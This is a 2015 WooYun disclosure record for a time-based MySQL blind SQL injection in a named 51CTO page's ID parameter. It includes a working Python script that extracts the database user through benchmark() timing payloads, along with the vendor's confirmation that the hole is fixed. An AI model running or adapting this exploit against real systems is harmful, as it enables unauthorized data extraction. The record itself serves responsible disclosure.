{"id": 21456, "wybug_id": "wooyun-2015-0114907", "wybug_title": "51CTO某站点MySQL盲注(附验证脚本)", "wybug_corp": "51CTO技术网站", "wybug_author": "lijiejie", "wybug_date": "2015-05-19 10:29", "wybug_open_date": "2015-07-04 14:56", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向公众公开  简要描述： 51CTO某站点MySQL盲注(附验证脚本) 详细说明：  注射点：\nhttp://new.51cto.com/php/viewart.php?ID=10013.htm\nID可注入。MySQL time blind.   漏洞证明：  猜解user(）：\n[Done]MySQL user is mysql@192.168.168.48\n\n\n验证脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'start to retrive MySQL user:'user = ''for i in range(1,21):    for payload in payloads:        timeout_count = 0        for _ in range(3):            conn = httplib.HTTPConnection('new.51cto.com', timeout=60)            s = \"ascii(mid(lower(user()),%s,1))=%s\" % (i, ord(payload))            conn.request(method='GET',                         url='/php/viewart.php?ID=if(%s,benchmark(2000000,md5(1)),0)' % s,                         headers = headers)            start_time = time.time()            html_doc = conn.getresponse().read()            conn.close()            print '.',            if time.time() - start_time > 0.5:                timeout_count += 1            else:                break        if timeout_count == 3:            user += payload            sys.stdout.write('\\r[In progress] %s' % user)            sys.stdout.flush()            breakprint '\\n[Done]MySQL user is', user\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-20 14:55 厂商回复： 漏洞已经修复，感谢白帽子提醒。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-19 11:00 |    \t\t百变屌丝 \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:7        | 屌丝一个而且是百变的，临时工)\t\t \n  李姐姐 最近开挂刷洞了 ，难道在测试神器    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}